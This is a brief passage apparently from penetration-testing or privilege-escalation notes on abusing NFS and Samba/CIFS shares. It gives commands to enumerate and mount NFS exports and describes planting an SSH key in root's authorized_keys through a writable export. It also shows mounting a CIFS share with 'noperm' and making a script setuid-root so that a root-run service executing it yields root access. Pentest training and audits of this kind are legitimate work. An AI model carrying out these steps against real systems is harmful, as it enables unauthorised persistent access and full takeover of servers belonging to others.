**NFS Shares**
```bash
showmount -e target_host   # enumerate exports
mount -t nfs target_host:/exported/path /mnt
```
If you can write to a writable NFS export that’s mounted on the server’s root (e.g., `/home`), you can place an SSH key in `/mnt/root/.ssh/authorized_keys`.
**Samba / CIFS**
```bash
mount -t cifs //server/share /mnt -o username=user,password=pass,noperm
```
If `noperm` is set or the share is writable by user, you can:
```bash
chown root:root /mnt/myscript.sh
chmod 4755 /mnt/myscript.sh
```
If a root-owned service executes `myscript.sh` from `/mnt`, you gain root.
